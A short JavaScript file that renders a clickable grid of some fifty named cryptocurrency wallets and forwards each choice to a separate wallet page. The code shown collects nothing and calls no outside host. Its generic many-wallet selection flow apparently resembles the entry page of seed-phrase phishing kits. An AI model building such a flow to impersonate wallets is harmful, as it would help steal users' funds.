console.log("Wallets page loaded!");

// Final clean wallet list (no duplicates)
const wallets = [
  "Meta Mask",
  "Trust",
  "Solflare",
  "WalletConnect",
  "Other Wallets",
  "Terra",
  "Bitpay",
  "Maiar",
  "MyKey",
  "Atwallet",
  "Authereum",
  "Bitfrost",
  "Coinbase1",
  "Coinomi",
  "Dcent",
  "Easypocket",
  "Ledger",
  "Coolwallet",
  "Cybavowallet",
  "Coin98",
  "Harmony",
  "PeakDefi",
  "Gridplus",
  "VIA",
  "Imtoken",
  "Infinito",
  "Infinity",
  "Kadachain",
  "Keplr",
  "Midas1",
  "Marixwallet",
  "Midas2",
  "Nash",
  "Onto",
  "Ownbit",
  "Pillar",
  "Rainbow",
  "Safepal",
  "Sollet",
  "Spark",
  "Spatium",
  "Tokenary",
  "Tokenpocket",
  "Tomo",
  "Torus",
  "Coinbase2",
  "XDC",
  "Walletio",
  "Walleth",
  "Zelcore",
  "Phantom",
  "Exodus",
  "Binance",
  "Bitget",
  "Poloniex",
];

const container = document.getElementById("walletContainer");

wallets.forEach((name) => {
  // Convert name → image filename
  let imageName =
    name
      .toLowerCase()
      .replace(/\s+/g, "") // remove spaces
      .replace(/'/g, "") // remove '
      .replace(/\./g, "") // remove .
      .replace(/-/g, "") // remove -
      .replace(/\//g, "") + // remove /
    ".webp";

  // Special FIX (Other Wallets → NO IMAGE)
  if (name.toLowerCase().includes("other")) {
    container.innerHTML += `
            <div class="wallet-card" onclick="openWallet('${name}')">
                <p>${name}</p>
            </div>
        `;
    return;
  }

  // Show console log to see which file is being loaded
  console.log("Loading:", imageName);

  // Normal wallet card
  container.innerHTML += `
        <div class="wallet-card" onclick="openWallet('${name}')">
            <img src="wallet-icons/${imageName}" alt="${name}">
            <p>${name}</p>
        </div>
    `;
});

function openWallet(walletName) {
  window.location.href = `wallet-page.html?wallet=${walletName}`;
}
